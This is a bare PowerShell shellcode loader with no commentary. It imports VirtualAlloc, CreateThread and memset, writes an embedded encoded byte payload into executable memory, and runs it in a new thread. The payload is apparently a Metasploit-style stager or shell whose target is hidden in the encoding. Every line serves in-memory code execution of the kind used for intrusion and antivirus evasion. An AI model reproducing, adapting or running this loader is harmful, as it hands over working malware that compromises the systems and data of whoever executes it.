$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd5,0xb8,0xef,0xaf,0xff,0xcb,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x46,0x18,0x83,0xee,0xfc,0x03,0x46,0xfb,0x4d,0x0a,0x37,0xeb,0x10,0xf5,0xc8,0xeb,0x74,0x7f,0x2d,0xda,0xb4,0x1b,0x25,0x4c,0x05,0x6f,0x6b,0x60,0xee,0x3d,0x98,0xf3,0x82,0xe9,0xaf,0xb4,0x29,0xcc,0x9e,0x45,0x01,0x2c,0x80,0xc5,0x58,0x61,0x62,0xf4,0x92,0x74,0x63,0x31,0xce,0x75,0x31,0xea,0x84,0x28,0xa6,0x9f,0xd1,0xf0,0x4d,0xd3,0xf4,0x70,0xb1,0xa3,0xf7,0x51,0x64,0xb8,0xa1,0x71,0x86,0x6d,0xda,0x3b,0x90,0x72,0xe7,0xf2,0x2b,0x40,0x93,0x04,0xfa,0x99,0x5c,0xaa,0xc3,0x16,0xaf,0xb2,0x04,0x90,0x50,0xc1,0x7c,0xe3,0xed,0xd2,0xba,0x9e,0x29,0x56,0x59,0x38,0xb9,0xc0,0x85,0xb9,0x6e,0x96,0x4e,0xb5,0xdb,0xdc,0x09,0xd9,0xda,0x31,0x22,0xe5,0x57,0xb4,0xe5,0x6c,0x23,0x93,0x21,0x35,0xf7,0xba,0x70,0x93,0x56,0xc2,0x63,0x7c,0x06,0x66,0xef,0x90,0x53,0x1b,0xb2,0xfc,0x90,0x16,0x4d,0xfc,0xbe,0x21,0x3e,0xce,0x61,0x9a,0xa8,0x62,0xe9,0x04,0x2e,0x85,0xc0,0xf1,0xa0,0x78,0xeb,0x01,0xe8,0xbe,0xbf,0x51,0x82,0x17,0xc0,0x39,0x52,0x98,0x15,0xd7,0x57,0x0e,0xbf,0x48,0x21,0x32,0xd7,0x8a,0xd1,0xd0,0x22,0x02,0x37,0xb4,0x62,0x44,0xe8,0x74,0xd3,0x24,0x58,0x1c,0x39,0xab,0x87,0x3c,0x42,0x61,0xa0,0xd6,0xad,0xdc,0x98,0x4e,0x57,0x45,0x52,0xef,0x98,0x53,0x1e,0x2f,0x12,0x50,0xde,0xe1,0xd3,0x1d,0xcc,0x95,0x13,0x68,0xae,0x33,0x2b,0x46,0xc5,0xbb,0xb9,0x6d,0x4c,0xec,0x55,0x6c,0xa9,0xda,0xf9,0x8f,0x9c,0x51,0x33,0x1a,0x5f,0x0d,0x3c,0xca,0x5f,0xcd,0x6a,0x80,0x5f,0xa5,0xca,0xf0,0x33,0xd0,0x14,0x2d,0x20,0x49,0x81,0xce,0x11,0x3e,0x02,0xa7,0x9f,0x19,0x64,0x68,0x5f,0x4c,0x74,0x54,0xb6,0xa8,0x02,0xb4,0x0a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
